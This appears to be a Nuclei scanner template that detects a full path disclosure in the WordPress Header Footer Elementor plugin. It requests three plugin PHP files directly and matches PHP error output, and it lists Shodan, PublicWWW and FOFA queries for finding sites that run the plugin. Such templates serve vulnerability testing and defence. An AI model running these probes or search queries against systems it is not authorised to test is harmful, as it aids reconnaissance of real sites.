id: wp-header-footer-elementor-fpd

info:
  name: WordPress Header Footer Elementor - Full Path Disclosure
  author: ritikchaddha
  severity: low
  description: |
    WordPress Header Footer Elementor plugin (also known as Ultimate Addons for Elementor - Lite) contains PHP files that lack proper ABSPATH protection, allowing direct access that reveals sensitive server path information via PHP error messages.
  reference:
    - https://wordpress.org/plugins/header-footer-elementor/
  metadata:
    verified: true
    max-request: 3
    vendor: brainstormforce
    product: header-footer-elementor
    framework: wordpress
    shodan-query: html:"wp-content/plugins/header-footer-elementor/"
    publicwww-query: "/wp-content/plugins/header-footer-elementor/"
    fofa-query: body="/wp-content/plugins/header-footer-elementor/"
  tags: wp,wordpress,wp-plugin,fpd,header-footer-elementor

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/header-footer-elementor/inc/widgets-manager/widgets/navigation-menu/navigation-menu.php"
      - "{{BaseURL}}/wp-content/plugins/header-footer-elementor/inc/widgets-manager/widgets/copyright/copyright.php"
      - "{{BaseURL}}/wp-content/plugins/header-footer-elementor/inc/widgets-manager/class-widgets-loader.php"

    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "Fatal error", "Uncaught Error") || contains_all(body, "Warning:", "failed to open stream")'
          - 'contains(body, "header-footer-elementor")'
          - 'status_code == 200 || status_code == 500'
        condition: and
